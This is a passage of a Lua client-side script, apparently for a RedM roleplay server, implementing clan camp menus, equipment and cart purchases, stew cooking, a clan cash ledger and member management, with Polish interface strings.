                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent5z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu6..' '..Config.equipmentprice.tentu6.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu6) then
                    if lev >=  Config.level.tentu6 then
        
                        cost = Config.equipmentprice.tentu6
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 5
                            model = 6
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end            
        elseif WarMenu.IsMenuOpened('tentslot') then
            if hastent1z == 0 then
                if WarMenu.Button(Config.Language.buytent1..' '..Config.equipmentprice.tent1.." "..Config.webhookLanguage.currency) then
                     cost = Config.equipmentprice.tent1
                     total = cash - cost
                    if 0 > total then
                        TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                    else
                        tentslotno = 1
                        local type = 1
                        TriggerServerEvent('syn:props',clanid2, type)
                    end
                WarMenu.CloseMenu()
                end
            
            elseif hastent2z == 0 then
                if WarMenu.Button(Config.Language.buytent2..' '..Config.equipmentprice.tent2.." "..Config.webhookLanguage.currency) then
                    local cost = Config.equipmentprice.tent2
                    local total = cash - cost
                    if 0 > total then
                        TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                    else
                        tentslotno = 2
                        local type = 1
                        TriggerServerEvent('syn:props',clanid2, type)
                       
                    end
                WarMenu.CloseMenu()
                end
            
            elseif hastent3z == 0 then
                if WarMenu.Button(Config.Language.buytent3..' '..Config.equipmentprice.tent3.." "..Config.webhookLanguage.currency) then
                    local cost = Config.equipmentprice.tent3
                    local total = cash - cost
                    if 0 > total then
                        TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                    else
                        tentslotno = 3
                        local type = 1
                        TriggerServerEvent('syn:props',clanid2, type)                   
                    end
                WarMenu.CloseMenu()
                end
            elseif hastent4z == 0 then
                if WarMenu.Button(Config.Language.buytent4..' '..Config.equipmentprice.tent4.." "..Config.webhookLanguage.currency) then
                    local cost = Config.equipmentprice.tent4
                    local total = cash - cost
                    if 0 > total then
                        TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                    else
                        tentslotno = 4
                        local type = 1
                        TriggerServerEvent('syn:props',clanid2, type)
                    end
                WarMenu.CloseMenu()
                end
            elseif hastent5z == 0 then
                if WarMenu.Button(Config.Language.buytent5..' '..Config.equipmentprice.tent5.." "..Config.webhookLanguage.currency) then
                    local cost = Config.equipmentprice.tent5
                    local total = cash - cost
                    if 0 > total then
                        TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                    else
                        tentslotno = 5
                        local type = 1
                        TriggerServerEvent('syn:props',clanid2, type)
                    end
                    WarMenu.CloseMenu()
                end
            end
            if campfirez == 0 then
                
                if WarMenu.Button(Config.Language.fire..' '..Config.equipmentprice.fire.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.fire) then
                    if lev >=  Config.level.fire then

                        cost = Config.equipmentprice.fire
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 6
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end
            if hitch1z == 0 then 
                if WarMenu.Button(Config.Language.post..' '..Config.equipmentprice.post.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.post) then
                    if lev >=  Config.level.post then

                        cost = Config.equipmentprice.post
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 7
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            
            elseif hitch2z == 0 then 
                if WarMenu.Button(Config.Language.post..' '..Config.equipmentprice.post.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.post) then
                    if lev >=  Config.level.post then

                        cost = Config.equipmentprice.post
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 8
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end
            if tablez == 0 then 
                if WarMenu.Button(Config.Language.table..' '..Config.equipmentprice.table.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.table) then
                    if lev >=  Config.level.table then

                        cost = Config.equipmentprice.table
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 9
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end
            if inventoryz == 0 then 
                if WarMenu.Button(Config.Language.invent..' '..Config.equipmentprice.invent.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.invent) then
                    if lev >=  Config.level.invent then

                        cost = Config.equipmentprice.invent
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 10
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end
            if stewz == 0 then 
                if WarMenu.Button(Config.Language.stew..' '..Config.equipmentprice.stew.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.stew) then
                    if lev >=  Config.level.stew then

                        cost = Config.equipmentprice.stew
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 11
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end
            if chair1z == 0 then 
                if WarMenu.Button(Config.Language.chair..' '..Config.equipmentprice.chair.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.chair) then
                    if lev >=  Config.level.chair then

                        cost = Config.equipmentprice.chair
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 12
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            elseif chair2z == 0 then 
                if WarMenu.Button(Config.Language.chair..' '..Config.equipmentprice.chair.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.chair) then
                    if lev >=  Config.level.chair then

                        cost = Config.equipmentprice.chair
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 13
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            elseif chair3z == 0 then 
                if WarMenu.Button(Config.Language.chair..' '..Config.equipmentprice.chair.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.chair) then
                    if lev >=  Config.level.chair then

                        cost = Config.equipmentprice.chair
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 14
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            elseif chair4z == 0 then 
                if WarMenu.Button(Config.Language.chair..' '..Config.equipmentprice.chair.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.chair) then
                    if lev >=  Config.level.chair then

                        cost = Config.equipmentprice.chair
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 15
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            elseif chair5z == 0 then 
                if WarMenu.Button(Config.Language.chair..' '..Config.equipmentprice.chair.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.chair) then
                    if lev >=  Config.level.chair then

                        cost = Config.equipmentprice.chair
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 16
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
             end
            if barrelz == 0 then 
                if WarMenu.Button(Config.Language.barrel..' '..Config.equipmentprice.barrel.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.barrel) then
                    if lev >=  Config.level.barrel then

                        cost = Config.equipmentprice.barrel
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 17
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end
            if destillerz == 0 then 
                if WarMenu.Button(Config.Language.destiller..' '..Config.equipmentprice.destiller.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.destiller) then
                    if lev >=  Config.level.destiller then

                        cost = Config.equipmentprice.destiller
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 18
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end
            if tannerz == 0 then 
                if WarMenu.Button(Config.Language.buybutcher..' '..Config.equipmentprice.butcher.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.butcher) then
                    if lev >=  Config.level.butcher then

                        cost = Config.equipmentprice.butcher
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            tentslotno = 19
                            local type = 1
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end
        elseif WarMenu.IsMenuOpened('createclan') then
                    
            if WarMenu.Button('Tak') then
                WarMenu.CloseMenu()
                TriggerEvent("syn:loadclan2")
                TriggerEvent("syn:registerclan")
            end
            if WarMenu.Button('Nie') then
                WarMenu.CloseMenu()
                end


        elseif WarMenu.IsMenuOpened('disband') then
                    
                if WarMenu.Button('Tak') then
                    if campregistered ~= 0 then 
                        TriggerServerEvent('syn:del', clanid2)
                        TriggerServerEvent('syn:additem1', "flag")
                        TriggerServerEvent('syn:additem1', "token")
                        RemoveBlip(blip)
                    end
                    TriggerServerEvent('syn:disbandclan')
                WarMenu.CloseMenu()
                end

                if WarMenu.Button('Nie') then
                    WarMenu.CloseMenu()
                    end

        elseif WarMenu.IsMenuOpened('changename') then
                    
                if WarMenu.Button('Tak') then
                TriggerEvent('syn:changename')
                WarMenu.CloseMenu()
                end
    
                if WarMenu.Button('Nie') then
                WarMenu.CloseMenu()
                end       

        elseif WarMenu.IsMenuOpened('registercamp') then
                    if WarMenu.Button('Tak') then
                        local _source = source
                        TriggerServerEvent("syn:campzone", clanid2)
                        Citizen.Wait(1000)
                        TriggerServerEvent('syn:refreshes',clanid2)
                        TriggerEvent("syn:loadblip")
                        TriggerServerEvent('syn:getclan')
                        TriggerServerEvent("syn:getclanid")
                        Citizen.Wait(1000)
                        TriggerServerEvent("syn:getcamp",clanid2)
                        WarMenu.CloseMenu()
                    end

                    if WarMenu.Button('No') then
                        WarMenu.CloseMenu()
                        end

             
        elseif WarMenu.IsMenuOpened('wardrobe') then
            if WarMenu.MenuButton("ZmieĹ„ UbiĂłr", 'outfits') then end
            if WarMenu.Button('Odpocznij') then
                TriggerEvent("syn:restcamp")
            end 
        elseif WarMenu.IsMenuOpened('stew') then
            if WarMenu.MenuButton("Przygotuj Gulasz", 'cook') then end
            if WarMenu.Button('WeĹş MiskÄ™') then
                TriggerEvent("syn:stew")
                WarMenu.CloseMenu()
            end 
        elseif WarMenu.IsMenuOpened('cook') then
            if WarMenu.MenuButton("ĹšmierdĹşÄ…cy Gulasz", 'recipe1') then end
            if WarMenu.MenuButton("Dobry Gulasz", 'recipe2') then end
            if WarMenu.MenuButton("Ĺšwietny Gulasz", 'recipe3') then end
            if WarMenu.MenuButton("DoskonaĹ‚y Gulasz", 'recipe4') then end
        elseif WarMenu.IsMenuOpened('recipe1') then
            if WarMenu.Button(Config.Recipe1.item1.." : "..Config.Recipe1.countitem1) then
            end
            if WarMenu.Button("Gotuj gulasz") then
                WarMenu.CloseMenu()
                local recipe = 1 
                TriggerServerEvent("syn:cookstew", recipe, clanid2)
                TriggerServerEvent('syn:getclan')
                TriggerServerEvent("syn:getclanid")
                Citizen.Wait(1000)
                TriggerServerEvent("syn:getcamp",clanid2)
            end
        elseif WarMenu.IsMenuOpened('recipe2') then
            if WarMenu.Button(Config.Recipe2.item1.." : "..Config.Recipe2.countitem1) then
            end
            if WarMenu.Button(Config.Recipe2.item2.." : "..Config.Recipe2.countitem2) then
            end
            if WarMenu.Button("Cook stew") then
                WarMenu.CloseMenu()
                local recipe = 2 
                TriggerServerEvent("syn:cookstew", recipe, clanid2)
                TriggerServerEvent('syn:getclan')
                TriggerServerEvent("syn:getclanid")
                Citizen.Wait(1000)
                TriggerServerEvent("syn:getcamp",clanid2)
            end
        elseif WarMenu.IsMenuOpened('recipe3') then
            if WarMenu.Button(Config.Recipe3.item1.." : "..Config.Recipe3.countitem1) then
            end
            if WarMenu.Button(Config.Recipe3.item2.." : "..Config.Recipe3.countitem2) then
            end
            if WarMenu.Button(Config.Recipe3.item3.." : "..Config.Recipe3.countitem3) then
            end
            if WarMenu.Button("Gotuj Gulasz") then
                WarMenu.CloseMenu()
                local recipe = 3 
                TriggerServerEvent("syn:cookstew", recipe, clanid2)
                TriggerServerEvent('syn:getclan')
                TriggerServerEvent("syn:getclanid")
                Citizen.Wait(1000)
                TriggerServerEvent("syn:getcamp",clanid2)
            end
        elseif WarMenu.IsMenuOpened('recipe4') then
            if WarMenu.Button(Config.Recipe4.item1.." : "..Config.Recipe4.countitem1) then
            end
            if WarMenu.Button(Config.Recipe4.item2.." : "..Config.Recipe4.countitem2) then
            end
            if WarMenu.Button(Config.Recipe4.item3.." : "..Config.Recipe4.countitem3) then
            end
            if WarMenu.Button(Config.Recipe4.item4.." : "..Config.Recipe4.countitem4) then
            end
            if WarMenu.Button("Gotuj Gulasz") then
                WarMenu.CloseMenu()
                local recipe = 4
                TriggerServerEvent("syn:cookstew", recipe, clanid2)
                TriggerServerEvent('syn:getclan')
                TriggerServerEvent("syn:getclanid")
                Citizen.Wait(1000)
                TriggerServerEvent("syn:getcamp",clanid2)
            end
        elseif WarMenu.IsMenuOpened('outfits') then
            if poutifts == 0 then
                WarMenu.Button('Brak zapisanych strojĂłw')
            else
                for i = 1, #poutifts do
                    if WarMenu.Button(poutifts[i].title) then
                        local jsonCloths = poutifts[i].comps
                        TriggerEvent("vorpcharacter:loadPlayerSkin", playerskin, jsonCloths)
                        TriggerServerEvent("syn:setoutfit", jsonCloths)
                        WarMenu.CloseMenu()
                    end
                end
            end

        elseif WarMenu.IsMenuOpened('clanoptions') then
            if WarMenu.Button('PokaĹĽ ObĂłz') then
                TriggerServerEvent('syn:refreshes',clanid2)
                WarMenu.CloseMenu()
                end
            if WarMenu.Button("Exp: ".. xp) then
            end
            if WarMenu.Button("Level: ".. lev) then
            end
            if WarMenu.MenuButton('PokaĹĽ '..clanname.." czĹ‚onkĂłw klanu", 'viewmembers') then end
            if clanboss == 1 then WarMenu.MenuButton('ZaproĹ›', 'inviteplayer') else end
            if clanboss == 1 then WarMenu.MenuButton('Oddaj przywĂłdztwo', 'switchleader') else end
            if clanboss == 1 then WarMenu.MenuButton('WyrzuÄ‡', 'kickmember') else end
            if clanboss == 0 then WarMenu.MenuButton('OpuĹ›Ä‡ Klan', 'leave') else end

        elseif WarMenu.IsMenuOpened('viewmembers') then
                
                for i = 1, #playeridinclan do
                    if WarMenu.Button(playeridinclan[i].name) then
                    end
                end
                
        elseif WarMenu.IsMenuOpened('kickmember') then
                for i = 1, #playeridinclan do
                    if WarMenu.Button(playeridinclan[i].name) then
                        local kickedman = playeridinclan[i].identifier
                        local kickedmanname = playeridinclan[i].name
                        TriggerServerEvent('syn:kickmember', kickedman, kickedmanname, clanid2)
                        WarMenu.CloseMenu()
                    end
                end
        elseif WarMenu.IsMenuOpened('leave') then
                    
                if WarMenu.Button('Tak') then
                TriggerServerEvent('syn:leaveclan',count2, clanid2)
                WarMenu.CloseMenu()
                end

                if WarMenu.Button('Nie') then
                    WarMenu.CloseMenu()
                    end

        elseif WarMenu.IsMenuOpened('switchleader') then
                    
                    if WarMenu.Button('Tak') then
                        TriggerEvent("syn:leadership")
                        WarMenu.CloseMenu()
                    end
    
                    if WarMenu.Button('Nie') then
                        WarMenu.CloseMenu()
                    end 
        elseif WarMenu.IsMenuOpened('inviteplayer') then
                    
                    if WarMenu.Button('Tak') then
                        TriggerEvent("syn:inviteplayer")
                        WarMenu.CloseMenu()
                    end
    
                    if WarMenu.Button('Nie') then
                        WarMenu.CloseMenu()
                    end             
                                
        
        elseif WarMenu.IsMenuOpened('butcher') then     
            if WarMenu.Button('WpĹ‚aÄ‡') then
                sellAnimal()     
                WarMenu.CloseMenu()
            end
            if WarMenu.MenuButton("WĂłz MyĹ›liwski", 'cart') then end
             if WarMenu.Button("MateriaĹ‚y Obozowe: ".. materialz) then
                end 
             if WarMenu.Button("Magazyn Obozowy: ".. stockz) then
                end 
            if WarMenu.MenuButton("Dokonaj Dostawy", 'deliver') then end
        elseif WarMenu.IsMenuOpened('deliver') then 
            if 25 > stockz then
                if WarMenu.Button('Za maĹ‚o zapasĂłw, Wymagane jest co najmniej 25 sztuk!') then
                end 
            end
            if 2 > cartz then
                if WarMenu.Button('Potrzebujesz maĹ‚ego wozu dostawczego') then
                end 
            end
            if stockz >= 25 and cartz >= 2 then
                if WarMenu.Button('Deliver 25 Stock') then
                    local closestPlayer, closestDistance = GetClosestPlayer()
                    if closestPlayer ~= -1 and closestDistance <= 2.0 then                       
                        TriggerEvent("syn:warndistance2")
                        WarMenu.CloseMenu()
                    else
                        stockmission = 1
                        TriggerServerEvent("syn:startdelivery",clanid2, stockz, stockmission)
                        TriggerEvent("syn:deliveryfunction")
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if stockz >= 50 and cartz >= 3 then
                if WarMenu.Button('Deliver 50 Stock') then
                    local closestPlayer, closestDistance = GetClosestPlayer()
                    if closestPlayer ~= -1 and closestDistance <= 2.0 then
                        TriggerEvent("syn:warndistance2")
                        WarMenu.CloseMenu()
                    else
                        stockmission = 2
                        TriggerServerEvent("syn:startdelivery",clanid2, stockz, stockmission)
                        TriggerEvent("syn:deliveryfunction")
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if stockz >= 100 and cartz == 4 then
                if WarMenu.Button('Deliver 100 Stock') then
                    local closestPlayer, closestDistance = GetClosestPlayer()
                    if closestPlayer ~= -1 and closestDistance <= 2.0 then
                        TriggerEvent("syn:warndistance2")
                        WarMenu.CloseMenu()
                    else
                        stockmission = 3
                        TriggerServerEvent("syn:startdelivery",clanid2, stockz, stockmission)
                        TriggerEvent("syn:deliveryfunction")
                        WarMenu.CloseMenu()
                    end
                end 
            end

            
        elseif WarMenu.IsMenuOpened('cart') then

            if clanboss == 1 and cartz == 0 then 
                if WarMenu.Button(Config.Language.buyhuntingcart..' '..Config.Cartprice.Hunting.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.Hunting) then
                    if lev >=  Config.level.Hunting then
                        local cost = Config.Cartprice.Hunting
                        local total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            local cartlevel = 1
                            TriggerServerEvent('syn:buycart',clanid2,cartlevel)
                            TriggerEvent("vorp:TipBottom", Config.Language.boughtwagon, 2000)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.boughtwagon..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)                            
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end

            if clanboss == 1 and 1 == cartz then 
                if WarMenu.Button(Config.Language.buysmalldelivery..' '..Config.Cartprice.smalldelivery.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.smalldelivery) then
                    if lev >=  Config.level.smalldelivery then
   
                        local cost = Config.Cartprice.smalldelivery
                        local total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            local cartlevel = 2
                            TriggerServerEvent('syn:buycart',clanid2,cartlevel)
                            TriggerEvent("vorp:TipBottom", Config.Language.boughtwagon2, 2000)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.boughtwagon2..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)    
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end

            if clanboss == 1 and 2 == cartz then 
                if WarMenu.Button(Config.Language.buymediumdelivery..' '..Config.Cartprice.mediumdelivery.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.mediumdelivery) then
                    if lev >=  Config.level.mediumdelivery then

                        local cost = Config.Cartprice.mediumdelivery
                        local total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            local cartlevel = 3
                            TriggerServerEvent('syn:buycart',clanid2,cartlevel)
                            TriggerEvent("vorp:TipBottom", Config.Language.boughtwagon3, 2000)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.boughtwagon3..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)    
                        end
                        WarMenu.CloseMenu()
                    end
                end
            end

            if clanboss == 1 and 3 == cartz then 
                if WarMenu.Button(Config.Language.buylargedelivery..' '..Config.Cartprice.largedelivery.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.largedelivery) then
                    if lev >=  Config.level.largedelivery then
   
                        local cost = Config.Cartprice.largedelivery
                        local total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            local cartlevel = 4
                            TriggerServerEvent('syn:buycart',clanid2,cartlevel)
                            TriggerEvent("vorp:TipBottom", Config.Language.boughtwagon4, 2000)
                            if web == 0 then
                            else
                            local msg = Config.webhookLanguage.boughtwagon4..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                            TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                        end
                    end
                WarMenu.CloseMenu()
                end
            end


            if cartz >= 1 then 
                if WarMenu.Button(Config.Language.renthuntingcart..' '..Config.Cartprice.Huntingrent.." "..Config.webhookLanguage.currency) then
                    local cost = Config.Cartprice.Huntingrent
                    local total = cash - cost
                    if 0 > total then
                        TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                    else
                        TriggerServerEvent("syn:cashledger", total, clanid2)
                        spawncart = true
                        TriggerEvent("vorp:TipBottom", Config.Language.rentwagon, 2000)
                        if web == 0 then
                        else
                            TriggerServerEvent('syn:getname')
                            Citizen.Wait(500)
                            local msg = playernamez ..Config.webhookLanguage.rentedcart..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                            TriggerServerEvent('syn:log', web,  msg, clanname)
                        end
                    end
                WarMenu.CloseMenu()
                end
            end



        
        
        
        
        end -- last menu end    
    
        WarMenu.Display()
		Citizen.Wait(0)
	end
end)


-------CLAN CREATION-----------
RegisterNetEvent("syn:inviteplayer")
AddEventHandler("syn:inviteplayer", function()
    
    SetNuiFocus(true,true)

    SendNUIMessage({
        action = "invite"
    })
end)

RegisterNetEvent("syn:leadership")
AddEventHandler("syn:leadership", function()
    
    SetNuiFocus(true,true)

    SendNUIMessage({
        action = "leadership"
    })
end)

RegisterNetEvent("syn:registerclan")
AddEventHandler("syn:registerclan", function()

    SetNuiFocus(true,true)

    SendNUIMessage({
        action = "createclan"
    })

    
end)

RegisterNetEvent("syn:webhook")
AddEventHandler("syn:webhook", function()

    SetNuiFocus(true,true)

    SendNUIMessage({
        action = "createwebhook"
    })
    
end)

RegisterNetEvent("syn:changename")
AddEventHandler("syn:changename", function()

    SetNuiFocus(true,true)

    SendNUIMessage({
        action = "clanrename"
    })
    
end)

RegisterNUICallback('createwebhook', function(data)
    local webhook=data.webhook
    if webhook ~= nil and webhook ~="" then
    TriggerServerEvent("syn:addwebhook", webhook, clanid2) 
    end
    SetNuiFocus(false,false)

end)

RegisterNUICallback('createclan', function(data)
    local clanName=data.clanName
    if clanName ~= nil and clanName ~="" then
        TriggerServerEvent("syn:register", clanName, clanid2)
    end
    SetNuiFocus(false,false)

end)

RegisterNUICallback('inviteplayer', function(data)
    local playerid=data.playerID
    id = playerid
    if playerid ~= nil and playerid ~="" then
        TriggerServerEvent('syn:getclan')
        TriggerServerEvent("syn:getclanid")
        TriggerServerEvent("syn:inviteplayers2", playerid) 
    end
    SetNuiFocus(false,false)

end)

RegisterNUICallback('leadership', function(data) 
    local leadership=data.leadership
    newleader = leadership
    if leadership ~= nil and leadership ~="" then
        TriggerServerEvent('syn:getclan')
        TriggerServerEvent("syn:getclanid")
        TriggerServerEvent("syn:changeleader", leadership) 
    end
    SetNuiFocus(false,false)

end)

RegisterNUICallback('clanrename', function(data)
    local clanrename=data.clanrename
    if clanrename ~= nil and clanrename ~="" then
        TriggerServerEvent("syn:changeclanname", clanrename, clanid2)
    end
    SetNuiFocus(false,false)

end)

RegisterNetEvent("syn:name")
AddEventHandler("syn:name", function(name, money)
    playernamez = name
    playermoney = money
end)

RegisterNetEvent("syn:ledger")
AddEventHandler("syn:ledger", function()

    AddTextEntry("FMMC_MPM_TYP8", "Amount :")
    DisplayOnscreenKeyboard(1, "FMMC_MPM_TYP8", "", "", "", "", "", 30)
    while (UpdateOnscreenKeyboard() == 0) do
        DisableAllControlActions(0);
        Citizen.Wait(0);
    end
    if (UpdateOnscreenKeyboard() == 1) then
        local amount = GetOnscreenKeyboardResult()
        if amount ~= nil then

            if cashstatus == 1 then -- add
                TriggerServerEvent('syn:getname')
                Citizen.Wait(500)
                local total = cash + amount
                local balance = playermoney - amount
                if 0 > balance then 
                    TriggerEvent("vorp:TipBottom", "Nie masz wystarczajÄ…co pieniÄ™dzy", 2000)

                else
                    TriggerServerEvent('syn:takecash',amount)
                    TriggerServerEvent("syn:cashledger", total, clanid2)
                    TriggerEvent("vorp:TipBottom", "WpĹ‚aciĹ‚eĹ› "..amount.." $", 2000)
                    if web == 0 then 
                    else
                        local msg = playernamez .." WpĹ‚aciĹ‚eĹ› "..amount.." $ do ksiÄ™gi klanu "..total.." $"
                        
                        TriggerServerEvent('syn:log', web,  msg, clanname)
                    end
                end


            elseif cashstatus == 2 then 
                local total = cash - amount
                if 0 > total then
                    local _source = source
                    TriggerEvent("vorp:TipBottom", "NieprawidĹ‚owa Kwota", 2000)

                else
                    TriggerServerEvent("syn:cashledger", total, clanid2)
                    TriggerServerEvent('syn:givecash',amount)
                    TriggerEvent("vorp:TipBottom", "WypĹ‚aciĹ‚eĹ› "..amount.." $", 2000)
                    if web == 0 then 
                    else
                        TriggerServerEvent('syn:getname')
                        Citizen.Wait(500)
                        local msg = playernamez .." WypĹ‚aciĹ‚eĹ› "..amount.." $ z ksiÄ™gi klanu "..total.." $"
                        TriggerServerEvent('syn:log', web,  msg, clanname)
                    end

                end
            end            
        else
            local _source = source
            TriggerEvent("vorp:TipBottom", "NieprawidĹ‚owa Kwota", 2000)
        end
    end
    
end)

RegisterNetEvent("syn:loadclan")
AddEventHandler("syn:loadclan", function(isclan, count)
    local _source = source
    clanboss = isclan
    clancount = count
end)
RegisterNetEvent("syn:clanid")
AddEventHandler("syn:clanid", function(clanid,clannames, count)
    local _source = source
    clanid2 = clanid
    clanname = clannames
    count2 = count
    TriggerServerEvent("syn:listclan",clanid2)
end)

RegisterCommand('showclan', function(source, args, rawCommand)
    TriggerServerEvent('syn:getclan')
    Citizen.Wait(400)
    TriggerServerEvent("syn:getclanid")
    Citizen.Wait(400)
    if clanboss > 0 then 
        TriggerEvent("vorp:TipBottom", 'jesteĹ› liderem '..clanname.. ' klanu', 4000)
    else
        if clanid2 > 1 then
            TriggerEvent("vorp:TipBottom", 'jesteĹ› czĹ‚onkiem '..clanname.. ' klanu', 4000)
        else
            TriggerEvent("vorp:TipBottom", 'nie naleĹĽysz do klanu', 4000)
        end
    end
end, false)

